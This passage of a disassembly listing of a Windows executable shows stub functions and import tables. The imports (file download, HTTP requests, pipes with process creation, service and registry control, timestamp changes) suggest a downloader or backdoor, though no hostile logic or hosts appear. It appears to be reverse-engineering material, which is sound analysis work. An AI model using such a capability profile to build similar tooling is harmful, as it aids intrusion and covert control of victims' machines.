.text:00403866 ; [00000006 BYTES: COLLAPSED FUNCTION strcat. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:0040386C
.text:0040386C loc_40386C:
.text:0040386C jmp     ds:__CxxFrameHandler
.text:00403872 ; [00000006 BYTES: COLLAPSED FUNCTION _EH_prolog. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403878 ; [00000006 BYTES: COLLAPSED FUNCTION memcpy. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:0040387E align 10h
.text:00403880 ; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:004038AF ; [0000015E BYTES: COLLAPSED FUNCTION start. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403A0D align 2
.text:00403A0E ; [00000006 BYTES: COLLAPSED FUNCTION _XcptFilter. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403A14 ; [00000006 BYTES: COLLAPSED FUNCTION _initterm. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403A1A ; [00000012 BYTES: COLLAPSED FUNCTION __setdefaultprecision. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403A2C
.text:00403A2C
.text:00403A2C
.text:00403A2C sub_403A2C proc near
.text:00403A2C xor     eax, eax        ; 1
.text:00403A2E retn                    ; 1
.text:00403A2E sub_403A2C endp
.text:00403A2E
.text:00403A2F ; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403A30 ; [00000006 BYTES: COLLAPSED FUNCTION _controlfp. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403A36 ; [00000006 BYTES: COLLAPSED FUNCTION URLDownloadToFileA. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403A3C ; [00000006 BYTES: COLLAPSED FUNCTION GetUserNameExA. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403A42 align 4
.text:00403A44
.text:00403A44
.text:00403A44
.text:00403A44 sub_403A44 proc near
.text:00403A44 lea     ecx, [ebp-54h]  ; 1
.text:00403A47 jmp     sub_401078      ; 1
.text:00403A47 sub_403A44 endp
.text:00403A47
.text:00403A4C
.text:00403A4C loc_403A4C:
.text:00403A4C mov     eax, offset stru_404200
.text:00403A51 jmp     loc_40386C
.text:00403A56 align 4
.text:00403A58
.text:00403A58
.text:00403A58
.text:00403A58 sub_403A58 proc near
.text:00403A58 lea     ecx, [ebp-48h]  ; 1
.text:00403A5B jmp     sub_401078      ; 1
.text:00403A5B sub_403A58 endp
.text:00403A5B
.text:00403A60
.text:00403A60 loc_403A60:
.text:00403A60 mov     eax, offset stru_404228
.text:00403A65 jmp     loc_40386C
.text:00403A6A align 200h
.text:00403C00 dd 100h dup(?)
.text:00403C00 _text ends
.text:00403C00
.idata:00404000 ; Section 2. (virtual address 00004000)
.idata:00404000 ; Virtual size                  : 00000CEC (   3308.)
.idata:00404000 ; Section size in file          : 00000E00 (   3584.)
.idata:00404000 ; Offset to raw data for section: 00003000
.idata:00404000 ; Flags 40000040: Data Readable
.idata:00404000 ; Alignment     : default
.idata:00404000 ;
.idata:00404000 ; Imports from ADVAPI32.dll
.idata:00404000 ;
.idata:00404000
.idata:00404000 ; Segment type: Externs
.idata:00404000 ; _idata
.idata:00404000 ; BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)
.idata:00404000 extrn OpenProcessToken:dword
.idata:00404004 ; BOOL __stdcall CloseServiceHandle(SC_HANDLE hSCObject)
.idata:00404004 extrn CloseServiceHandle:dword
.idata:00404008 ; BOOL __stdcall EnumServicesStatusExA(SC_HANDLE hSCManager, SC_ENUM_TYPE InfoLevel, DWORD dwServiceType, DWORD dwServiceState, LPBYTE lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned, LPDWORD lpResumeHandle, LPCSTR pszGroupName)
.idata:00404008 extrn EnumServicesStatusExA:dword
.idata:0040400C ; SC_HANDLE __stdcall OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess)
.idata:0040400C extrn OpenSCManagerA:dword
.idata:00404010 ; BOOL __stdcall ControlService(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus)
.idata:00404010 extrn ControlService:dword
.idata:00404014 ; SC_HANDLE __stdcall OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess)
.idata:00404014 extrn OpenServiceA:dword
.idata:00404018 ; BOOL __stdcall StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors)
.idata:00404018 extrn StartServiceA:dword
.idata:0040401C ; BOOL __stdcall GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer)
.idata:0040401C extrn GetUserNameA:dword
.idata:00404020 ; LSTATUS __stdcall RegCloseKey(HKEY hKey)
.idata:00404020 extrn RegCloseKey:dword
.idata:00404024 ; LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData)
.idata:00404024 extrn RegSetValueExA:dword
.idata:00404028 ; LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition)
.idata:00404028 extrn RegCreateKeyExA:dword
.idata:0040402C ; LSTATUS __stdcall RegDeleteValueA(HKEY hKey, LPCSTR lpValueName)
.idata:0040402C extrn RegDeleteValueA:dword
.idata:00404030 ; BOOL __stdcall CreateProcessAsUserA(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
.idata:00404030 extrn CreateProcessAsUserA:dword
.idata:00404034
.idata:00404038 ;
.idata:00404038 ; Imports from KERNEL32.dll
.idata:00404038 ;
.idata:00404038 ; LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2)
.idata:00404038 extrn lstrcatA:dword
.idata:0040403C ; DWORD __stdcall GetLogicalDrives()
.idata:0040403C extrn GetLogicalDrives:dword
.idata:00404040 ; BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
.idata:00404040 extrn __imp_Process32Next:dword
.idata:00404044 ; BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
.idata:00404044 extrn __imp_Process32First:dword
.idata:00404048 ; HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID)
.idata:00404048 extrn __imp_CreateToolhelp32Snapshot:dword
.idata:0040404C ; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
.idata:0040404C extrn WriteFile:dword
.idata:00404050 ; DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)
.idata:00404050 extrn GetFileSize:dword
.idata:00404054 ; HANDLE __stdcall GetCurrentProcess()
.idata:00404054 extrn GetCurrentProcess:dword
.idata:00404058 ; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
.idata:00404058 extrn DeleteFileA:dword
.idata:0040405C ; DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
.idata:0040405C extrn GetModuleFileNameA:dword
.idata:00404060 ; void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)
.idata:00404060 extrn GetLocalTime:dword
.idata:00404064 ; UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName)
.idata:00404064 extrn GetDriveTypeA:dword
.idata:00404068 ; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName)
.idata:00404068 extrn CreateMutexA:dword
.idata:0040406C ; BOOL __stdcall SetFileTime(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime)
.idata:0040406C extrn SetFileTime:dword
.idata:00404070 ; BOOL __stdcall SystemTimeToFileTime(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime)
.idata:00404070 extrn SystemTimeToFileTime:dword
.idata:00404074 ; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
.idata:00404074 extrn GetSystemTime:dword
.idata:00404078 ; BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)
.idata:00404078 extrn CopyFileA:dword
.idata:0040407C ; int __stdcall lstrlenA(LPCSTR lpString)
.idata:0040407C extrn lstrlenA:dword
.idata:00404080 ; UINT __stdcall GetTempFileNameA(LPCSTR lpPathName, LPCSTR lpPrefixString, UINT uUnique, LPSTR lpTempFileName)
.idata:00404080 extrn GetTempFileNameA:dword
.idata:00404084 ; DWORD __stdcall GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer)
.idata:00404084 extrn GetTempPathA:dword
.idata:00404088 ; void __stdcall __noreturn ExitProcess(UINT uExitCode)
.idata:00404088 extrn ExitProcess:dword
.idata:0040408C ; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
.idata:0040408C extrn GetModuleHandleA:dword
.idata:00404090 ; BOOL __stdcall GetVolumeInformationA(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize)
.idata:00404090 extrn GetVolumeInformationA:dword
.idata:00404094 ; BOOL __stdcall SetStdHandle(DWORD nStdHandle, HANDLE hHandle)
.idata:00404094 extrn SetStdHandle:dword
.idata:00404098 ; DWORD __stdcall ExpandEnvironmentStringsA(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize)
.idata:00404098 extrn ExpandEnvironmentStringsA:dword
.idata:0040409C ; UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
.idata:0040409C extrn GetSystemDirectoryA:dword
.idata:004040A0 ; DWORD __stdcall GetFileAttributesA(LPCSTR lpFileName)
.idata:004040A0 extrn GetFileAttributesA:dword
.idata:004040A4 ; HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
.idata:004040A4 extrn OpenProcess:dword
.idata:004040A8 ; BOOL __stdcall GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode)
.idata:004040A8 extrn GetExitCodeProcess:dword
.idata:004040AC ; BOOL __stdcall PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage)
.idata:004040AC extrn PeekNamedPipe:dword
.idata:004040B0 ; BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
.idata:004040B0 extrn ReadFile:dword
.idata:004040B4 ; BOOL __stdcall GetConsoleDisplayMode(LPDWORD lpModeFlags)
.idata:004040B4 extrn GetConsoleDisplayMode:dword
.idata:004040B8 ; BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
.idata:004040B8 extrn CreateProcessA:dword
.idata:004040BC ; BOOL __stdcall AttachConsole(DWORD dwProcessId)
.idata:004040BC extrn AttachConsole:dword
.idata:004040C0 ; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
.idata:004040C0 extrn CreateFileA:dword
.idata:004040C4 ; BOOL __stdcall WriteConsoleInputA(HANDLE hConsoleInput, const INPUT_RECORD *lpBuffer, DWORD nLength, LPDWORD lpNumberOfEventsWritten)
.idata:004040C4 extrn WriteConsoleInputA:dword
.idata:004040C8 ; BOOL __stdcall GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize)
.idata:004040C8 extrn GetComputerNameA:dword
.idata:004040CC ; void __stdcall Sleep(DWORD dwMilliseconds)
.idata:004040CC extrn Sleep:dword
.idata:004040D0 ; BOOL __stdcall CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize)
.idata:004040D0 extrn CreatePipe:dword
.idata:004040D4 ; UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize)
.idata:004040D4 extrn GetWindowsDirectoryA:dword
.idata:004040D8 ; BOOL __stdcall SetCurrentDirectoryA(LPCSTR lpPathName)
.idata:004040D8 extrn SetCurrentDirectoryA:dword
.idata:004040DC ; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
.idata:004040DC extrn CreateThread:dword
.idata:004040E0 ; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode)
.idata:004040E0 extrn TerminateProcess:dword
.idata:004040E4 ; void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo)
.idata:004040E4 extrn GetStartupInfoA:dword
.idata:004040E8 ; DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
.idata:004040E8 extrn WaitForSingleObject:dword
.idata:004040EC ; BOOL __stdcall CloseHandle(HANDLE hObject)
.idata:004040EC extrn CloseHandle:dword
.idata:004040F0 ; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation)
.idata:004040F0 extrn GetVersionExA:dword
.idata:004040F4 ; DWORD __stdcall GetLastError()
.idata:004040F4 extrn GetLastError:dword
.idata:004040F8
.idata:004040FC ;
.idata:004040FC ; Imports from MSVCRT.dll
.idata:004040FC ;
.idata:004040FC ; void *__cdecl memcpy(void *Dst, const void *Src, size_t Size)
.idata:004040FC extrn __imp_memcpy:dword
.idata:00404100 ; char *__cdecl strstr(const char *Str, const char *SubStr)
.idata:00404100 extrn strstr:dword
.idata:00404104 ; int __cdecl strnicmp(const char *Str1, const char *Str, size_t MaxCount)
.idata:00404104 extrn _strnicmp:dword
.idata:00404108 ; char *__cdecl strchr(const char *Str, int Val)
.idata:00404108 extrn strchr:dword
.idata:0040410C ; void __cdecl __noreturn exit(int Code)
.idata:0040410C extrn _exit:dword
.idata:00404110 extrn __imp__XcptFilter:dword
.idata:00404114 ; void __cdecl __noreturn exit(int Code)
.idata:00404114 extrn exit:dword
.idata:00404118 extrn _acmdln:dword
.idata:0040411C extrn __getmainargs:dword
.idata:00404120 extrn __imp__initterm:dword
.idata:00404124 extrn __setusermatherr:dword
.idata:00404128 extrn _adjust_fdiv:dword
.idata:0040412C extrn __p__commode:dword
.idata:00404130 extrn __p__fmode:dword
.idata:00404134 extrn __set_app_type:dword
.idata:00404138 ; unsigned int __cdecl _controlfp(unsigned int NewValue, unsigned int Mask)
.idata:00404138 extrn __imp__controlfp:dword
.idata:0040413C ; __declspec(dllimport) void __cdecl operator delete(void *)
.idata:0040413C extrn __imp_??3@YAXPAX@Z:dword
.idata:00404140 ; size_t __cdecl strlen(const char *Str)
.idata:00404140 extrn __imp_strlen:dword
.idata:00404144 ; char *__cdecl strcpy(char *Dest, const char *Source)
.idata:00404144 extrn __imp_strcpy:dword
.idata:00404148 ; __declspec(dllimport) void * __cdecl operator new(unsigned int)
.idata:00404148 extrn __imp_??2@YAPAXI@Z:dword
.idata:0040414C ; int sprintf(char *Dest, const char *Format, ...)
.idata:0040414C extrn sprintf:dword
.idata:00404150 ; void *__cdecl memset(void *Dst, int Val, size_t Size)
.idata:00404150 extrn __imp_memset:dword
.idata:00404154 extrn _except_handler3:dword
.idata:00404158 ; int __cdecl atoi(const char *Str)
.idata:00404158 extrn atoi:dword
.idata:0040415C ; int __cdecl strcmpi(const char *Str1, const char *Str2)
.idata:0040415C extrn _strcmpi:dword
.idata:00404160 extrn __CxxFrameHandler:dword
.idata:00404164 extrn __imp__EH_prolog:dword
.idata:00404168 ; int __cdecl atol(const char *Str)
.idata:00404168 extrn atol:dword
.idata:0040416C ; int sscanf(const char *Src, const char *Format, ...)
.idata:0040416C extrn sscanf:dword
.idata:00404170 ; char *__cdecl strrchr(const char *Str, int Ch)
.idata:00404170 extrn strrchr:dword
.idata:00404174 ; char *__cdecl strcat(char *Dest, const char *Source)
.idata:00404174 extrn __imp_strcat:dword
.idata:00404178
.idata:0040417C ;
.idata:0040417C ; Imports from SHELL32.dll
.idata:0040417C ;
.idata:0040417C ; int __stdcall SHCreateDirectoryExA(HWND hwnd, LPCSTR pszPath, const SECURITY_ATTRIBUTES *psa)
.idata:0040417C extrn SHCreateDirectoryExA:dword
.idata:00404180 ; HINSTANCE __stdcall ShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd)
.idata:00404180 extrn ShellExecuteA:dword
.idata:00404184
.idata:00404188 ;
.idata:00404188 ; Imports from Secur32.dll
.idata:00404188 ;
.idata:00404188 ; BOOLEAN __stdcall GetUserNameExA(EXTENDED_NAME_FORMAT NameFormat, LPSTR lpNameBuffer, PULONG nSize)
.idata:00404188 extrn __imp_GetUserNameExA:dword
.idata:0040418C
.idata:00404190 ;
.idata:00404190 ; Imports from USER32.dll
.idata:00404190 ;
.idata:00404190 ; LRESULT __stdcall DefWindowProcA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
.idata:00404190 extrn DefWindowProcA:dword
.idata:00404194 ; ATOM __stdcall RegisterClassExA(const WNDCLASSEXA *)
.idata:00404194 extrn RegisterClassExA:dword
.idata:00404198 ; HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam)
.idata:00404198 extrn CreateWindowExA:dword
.idata:0040419C ; BOOL __stdcall GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
.idata:0040419C extrn GetMessageA:dword
.idata:004041A0 ; BOOL __stdcall TranslateMessage(const MSG *lpMsg)
.idata:004041A0 extrn TranslateMessage:dword
.idata:004041A4 ; LRESULT __stdcall DispatchMessageA(const MSG *lpMsg)
.idata:004041A4 extrn DispatchMessageA:dword
.idata:004041A8
.idata:004041AC ;
.idata:004041AC ; Imports from USERENV.dll
.idata:004041AC ;
.idata:004041AC extrn GetUserProfileDirectoryA:dword
.idata:004041B0
.idata:004041B4 ;
.idata:004041B4 ; Imports from WININET.dll
.idata:004041B4 ;
.idata:004041B4 ; BOOL __stdcall InternetSetOptionA(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength)
.idata:004041B4 extrn InternetSetOptionA:dword
.idata:004041B8 ; HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
.idata:004041B8 extrn InternetOpenA:dword
.idata:004041BC ; BOOL __stdcall InternetQueryOptionA(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength)
.idata:004041BC extrn InternetQueryOptionA:dword
.idata:004041C0 ; HINTERNET __stdcall InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
.idata:004041C0 extrn InternetConnectA:dword
.idata:004041C4 ; HINTERNET __stdcall HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
.idata:004041C4 extrn HttpOpenRequestA:dword
.idata:004041C8 ; BOOL __stdcall HttpAddRequestHeadersA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers)
.idata:004041C8 extrn HttpAddRequestHeadersA:dword
.idata:004041CC ; BOOL __stdcall HttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
.idata:004041CC extrn HttpSendRequestA:dword
.idata:004041D0 ; BOOL __stdcall InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
.idata:004041D0 extrn InternetReadFile:dword
.idata:004041D4 ; BOOL __stdcall InternetCloseHandle(HINTERNET hInternet)
.idata:004041D4 extrn InternetCloseHandle:dword
.idata:004041D8 ; HINTERNET __stdcall InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext)
.idata:004041D8 extrn InternetOpenUrlA:dword
.idata:004041DC
.idata:004041E0 ;
.idata:004041E0 ; Imports from urlmon.dll
.idata:004041E0 ;
.idata:004041E0 ; HRESULT __stdcall URLDownloadToFileA(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK)
.idata:004041E0 extrn __imp_URLDownloadToFileA:dword
.idata:004041E4
.idata:004041E4
.rdata:004041E8
.rdata:004041E8 ; Segment type: Pure data
.rdata:004041E8 ; Segment permissions: Read
.rdata:004041E8 _rdata segment para public 'DATA' use32
.rdata:004041E8 assume cs:_rdata
.rdata:004041E8 ;org 4041E8h
.rdata:004041E8 off_4041E8 dd offset sub_401000
.rdata:004041EC align 10h
.rdata:004041F0 stru_4041F0 _SCOPETABLE_ENTRY <0FFFFFFFFh, \ ; SEH scope table for function 4038AF
.rdata:004041F0                    offset loc_4039ED, \
.rdata:004041F0                    offset loc_403A01>
.rdata:004041FC align 10h
.rdata:00404200 stru_404200 FuncInfo_V1 <19930520h, 1, \
.rdata:00404200              offset stru_404220, 0, 0, \
.rdata:00404200              0, 0>
.rdata:0040421C db    0
.rdata:0040421D db    0
.rdata:0040421E db    0
.rdata:0040421F db    0
.rdata:00404220 stru_404220 UnwindMapEntry <-1, offset sub_403A44>
.rdata:00404228 stru_404228 FuncInfo_V1 <19930520h, 1, \
.rdata:00404228              offset stru_404248, 0, 0, \
.rdata:00404228              0, 0>
.rdata:00404244 db    0
.rdata:00404245 db    0
.rdata:00404246 db    0
.rdata:00404247 db    0
.rdata:00404248 stru_404248 UnwindMapEntry <-1, offset sub_403A58>
.rdata:00404250 __IMPORT_DESCRIPTOR_KERNEL32 dd rva off_404350 ; Import Name Table
.rdata:00404254 dd 0                    ; Time stamp
.rdata:00404258 dd 0                    ; Forwarder Chain
.rdata:0040425C dd rva aKernel32Dll     ; DLL Name
.rdata:00404260 dd rva lstrcatA         ; Import Address Table
.rdata:00404264 __IMPORT_DESCRIPTOR_USER32 dd rva off_4044A8 ; Import Name Table
.rdata:00404268 dd 0                    ; Time stamp
.rdata:0040426C dd 0                    ; Forwarder Chain
.rdata:00404270 dd rva aUser32Dll       ; DLL Name
.rdata:00404274 dd rva DefWindowProcA   ; Import Address Table
.rdata:00404278 __IMPORT_DESCRIPTOR_MSVCRT dd rva off_404414 ; Import Name Table
.rdata:0040427C dd 0                    ; Time stamp
.rdata:00404280 dd 0                    ; Forwarder Chain
.rdata:00404284 dd rva aMsvcrtDll       ; DLL Name
.rdata:00404288 dd rva __imp_memcpy     ; Import Address Table
.rdata:0040428C __IMPORT_DESCRIPTOR_WININET dd rva off_4044CC ; Import Name Table
.rdata:00404290 dd 0                    ; Time stamp
.rdata:00404294 dd 0                    ; Forwarder Chain
.rdata:00404298 dd rva aWininetDll      ; DLL Name
.rdata:0040429C dd rva InternetSetOptionA ; Import Address Table
.rdata:004042A0 __IMPORT_DESCRIPTOR_USERENV dd rva off_4044C4 ; Import Name Table
.rdata:004042A4 dd 0                    ; Time stamp
.rdata:004042A8 dd 0                    ; Forwarder Chain
.rdata:004042AC dd rva aUserenvDll      ; DLL Name
.rdata:004042B0 dd rva GetUserProfileDirectoryA ; Import Address Table
.rdata:004042B4 __IMPORT_DESCRIPTOR_ADVAPI32 dd rva off_404318 ; Import Name Table
.rdata:004042B8 dd 0                    ; Time stamp
.rdata:004042BC dd 0                    ; Forwarder Chain
.rdata:004042C0 dd rva aAdvapi32Dll     ; DLL Name
.rdata:004042C4 dd rva OpenProcessToken ; Import Address Table
.rdata:004042C8 __IMPORT_DESCRIPTOR_urlmon dd rva off_4044F8 ; Import Name Table
.rdata:004042CC dd 0                    ; Time stamp
.rdata:004042D0 dd 0                    ; Forwarder Chain
.rdata:004042D4 dd rva aUrlmonDll       ; DLL Name
.rdata:004042D8 dd rva __imp_URLDownloadToFileA ; Import Address Table
.rdata:004042DC __IMPORT_DESCRIPTOR_SHELL32 dd rva off_404494 ; Import Name Table
.rdata:004042E0 dd 0                    ; Time stamp
.rdata:004042E4 dd 0                    ; Forwarder Chain
.rdata:004042E8 dd rva aShell32Dll      ; DLL Name
.rdata:004042EC dd rva SHCreateDirectoryExA ; Import Address Table
.rdata:004042F0 __IMPORT_DESCRIPTOR_Secur32 dd rva off_4044A0 ; Import Name Table
.rdata:004042F4 dd 0                    ; Time stamp
.rdata:004042F8 dd 0                    ; Forwarder Chain
.rdata:004042FC dd rva aSecur32Dll      ; DLL Name
.rdata:00404300 dd rva __imp_GetUserNameExA ; Import Address Table
.rdata:00404304 db    0
.rdata:00404305 db    0
.rdata:00404306 db    0
.rdata:00404307 db    0
.rdata:00404308 db    0
.rdata:00404309 db    0
.rdata:0040430A db    0
.rdata:0040430B db    0
.rdata:0040430C db    0
.rdata:0040430D db    0
.rdata:0040430E db    0
.rdata:0040430F db    0
.rdata:00404310 db    0
.rdata:00404311 db    0
.rdata:00404312 db    0
.rdata:00404313 db    0
.rdata:00404314 db    0
.rdata:00404315 db    0
.rdata:00404316 db    0
.rdata:00404317 db    0
.rdata:00404318 ;
.rdata:00404318 ; Import names for ADVAPI32.dll
.rdata:00404318 ;
.rdata:00404318 off_404318 dd rva word_404B6A
.rdata:0040431C dd rva word_404B7E
.rdata:00404320 dd rva word_404B94
.rdata:00404324 dd rva word_404BAC
.rdata:00404328 dd rva word_404BBE
.rdata:0040432C dd rva word_404BD0
.rdata:00404330 dd rva word_404BE0
.rdata:00404334 dd rva word_404BF0
.rdata:00404338 dd rva word_404C00
.rdata:0040433C dd rva word_404C0E
.rdata:00404340 dd rva word_404C20
.rdata:00404344 dd rva word_404C32
.rdata:00404348 dd rva word_404B52
.rdata:0040434C dd 0
.rdata:00404350 ;
.rdata:00404350 ; Import names for KERNEL32.dll
.rdata:00404350 ;
.rdata:00404350 off_404350 dd rva word_4046D0
.rdata:00404354 dd rva word_4046DC
.rdata:00404358 dd rva word_4046F0
.rdata:0040435C dd rva word_404700
.rdata:00404360 dd rva word_404712
.rdata:00404364 dd rva word_40472E
.rdata:00404368 dd rva word_40473A
.rdata:0040436C dd rva word_404748
.rdata:00404370 dd rva word_40475C
.rdata:00404374 dd rva word_40476A
.rdata:00404378 dd rva word_404780
.rdata:0040437C dd rva word_4046C0
.rdata:00404380 dd rva word_4047A0
.rdata:00404384 dd rva word_4047B0
.rdata:00404388 dd rva word_4047BE
.rdata:0040438C dd rva word_4047D6
.rdata:00404390 dd rva word_4047E6
.rdata:00404394 dd rva word_4047F2
.rdata:00404398 dd rva word_4047FE
.rdata:0040439C dd rva word_404812
.rdata:004043A0 dd rva word_404822
.rdata:004043A4 dd rva word_404CC6
.rdata:004043A8 dd rva word_4046A8
.rdata:004043AC dd rva word_404698
.rdata:004043B0 dd rva word_40467C
.rdata:004043B4 dd rva word_404666
.rdata:004043B8 dd rva word_404650
.rdata:004043BC dd rva word_404642
.rdata:004043C0 dd rva word_40462C
.rdata:004043C4 dd rva word_40461C
.rdata:004043C8 dd rva word_404610
.rdata:004043CC dd rva word_4045F8
.rdata:004043D0 dd rva word_4045E6
.rdata:004043D4 dd rva word_4045D6
.rdata:004043D8 dd rva word_4045C8
.rdata:004043DC dd rva word_4045B2
.rdata:004043E0 dd rva word_40459E
.rdata:004043E4 dd rva word_404596
.rdata:004043E8 dd rva word_404588
.rdata:004043EC dd rva word_404570
.rdata:004043F0 dd rva word_404558
.rdata:004043F4 dd rva word_404548
.rdata:004043F8 dd rva word_404534
.rdata:004043FC dd rva word_404CDA
.rdata:00404400 dd rva word_40451E
.rdata:00404404 dd rva word_404510
.rdata:00404408 dd rva word_404790
.rdata:0040440C dd rva word_404500
.rdata:00404410 dd 0
.rdata:00404414 ;
